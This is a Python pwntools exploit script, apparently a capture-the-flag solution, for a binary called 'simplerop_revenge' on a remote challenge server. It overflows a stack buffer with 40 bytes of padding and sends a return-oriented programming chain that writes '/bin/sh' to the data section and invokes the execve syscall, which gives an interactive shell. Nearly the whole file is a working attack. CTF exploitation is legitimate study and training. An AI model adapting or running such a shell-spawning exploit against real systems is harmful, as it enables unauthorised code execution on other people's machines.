#!/usr/bin/env python
from pwn import *

context(arch = "amd64", os = "linux", bits = 64)

DEBUG = False
if DEBUG:
    p = process("simplerop_revenge")
    # p = remote("127.0.0.1", 8888)
else:
    p = remote("pwnhub.tw", 8361)

p.recvuntil(":")

padding = "A" * 40

mov_rsi_rdi = 0x000000000047a502    # mov qword ptr [rdi], rsi ; ret
pop_rsi = 0x0000000000401577 # pop rsi ; ret
pop_rdi = 0x0000000000401456 # pop rdi ; ret
data_section = 0x00000000006c9a20
pop_rax_rdx_rbx = 0x0000000000478516 # pop rax ; pop rdx ; pop rbx ; ret
syscall = 0x00000000004671b5    # syscall

rop_chain = flat([pop_rdi, data_section,
                  pop_rsi, "/bin/sh\x00",
                  mov_rsi_rdi,
                  pop_rax_rdx_rbx, 0x3b, 0, 0,
                  pop_rsi, 0,
                  syscall
                  ])

payload = padding + rop_chain

p.sendline(payload)

p.interactive()
p.close()
